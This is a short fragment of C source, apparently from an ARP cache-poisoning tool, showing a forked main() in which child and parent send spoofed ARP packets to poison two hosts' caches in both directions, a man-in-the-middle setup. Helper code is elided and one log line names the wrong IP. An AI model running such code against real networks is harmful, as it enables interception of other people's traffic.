...
main(int argc, char **argv)
{
  ...
  if(childpid == 0) {
    // Child poisons target's cache for victim's IP.
    print_log("Send ARP packets of type %s to poison %s\n", arptype, victim_ip);
    send_arp_packets(handle, num_packets, type, source_mac, 0, victim_ip,
                     target_ip);
    exit(EXIT_SUCCESS);
  }

  // Parent poisons victim's cache for target's IP
  print_log("Send ARP packets of type %s to poison %s\n", arptype, victim_ip);
  send_arp_packets(handle, num_packets, type, source_mac, 0, target_ip,
                   victim_ip);
